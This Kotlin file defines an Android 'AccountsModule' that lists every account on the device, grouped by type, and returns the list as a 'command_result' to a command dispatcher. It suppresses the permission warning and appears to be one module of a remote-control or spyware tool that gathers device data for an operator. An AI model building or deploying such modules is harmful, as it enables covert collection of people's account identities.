package com.android.modules

import android.accounts.AccountManager
import android.annotation.SuppressLint
import android.content.Context

/** AccountsModule — list all accounts registered on the device */
@SuppressLint("MissingPermission")
class AccountsModule {
    fun execute(ctx: Context, command: String, extra: String?): Pair<String, String> =
        Pair(getAccounts(ctx), "command_result")

    private fun getAccounts(ctx: Context): String {
        return try {
            val accounts = AccountManager.get(ctx).accounts
            if (accounts.isEmpty()) return "No accounts found on device."
            val sb = StringBuilder("=== Device Accounts (${accounts.size}) ===\n")
            accounts.groupBy { it.type }.forEach { (type, list) ->
                sb.appendLine("\n[$type]")
                list.forEach { sb.appendLine("  • ${it.name}") }
            }
            sb.toString()
        } catch (e: Exception) { "Error: ${e.message}" }
    }
}
